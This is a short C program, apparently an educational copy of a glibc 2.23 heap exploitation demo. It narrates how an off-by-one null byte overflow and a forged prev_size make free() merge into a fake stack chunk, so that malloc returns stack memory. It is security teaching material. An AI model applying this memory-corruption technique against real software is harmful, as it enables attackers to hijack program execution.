//gcc -g hollk.c -o hollk
//glibc-2.23
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>

int main()
{
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);

    uint8_t* a;
    uint8_t* b;
    uint8_t* d;

    a = (uint8_t*) malloc(0x38);
    printf("a: %p\n", a);

    int real_a_size = malloc_usable_size(a);
    printf("Since we want to overflow 'a', we need the 'real' size of 'a' after rounding:%#x\n", real_a_size);

    size_t fake_chunk[6];

    fake_chunk[0] = 0x100;
    fake_chunk[1] = 0x100;
    fake_chunk[2] = (size_t) fake_chunk;
    fake_chunk[3] = (size_t) fake_chunk;
    fake_chunk[4] = (size_t) fake_chunk;
    fake_chunk[5] = (size_t) fake_chunk;
    printf("Our fake chunk at %p looks like:\n", fake_chunk);

    b = (uint8_t*) malloc(0xf8);
    int real_b_size = malloc_usable_size(b);
    printf("b: %p\n", b);

    uint64_t* b_size_ptr = (uint64_t*)(b - 8);
    printf("\nb.size: %#lx\n", *b_size_ptr);
    a[real_a_size] = 0; //修改下一堆块的prev_inuse位为零
    printf("b.size: %#lx\n", *b_size_ptr);

    size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);
    printf("Our fake prev_size will be %p - %p = %#lx\n", b-sizeof(size_t)*2, fake_chunk, fake_size);
    *(size_t*)&a[real_a_size-sizeof(size_t)] = fake_size;

    fake_chunk[1] = fake_size;

    free(b);
    printf("Our fake chunk size is now %#lx (b.size + fake_prev_size)\n", fake_chunk[1]);

    d = malloc(0x200);
    printf("Next malloc(0x200) is at %p\n", d);
}
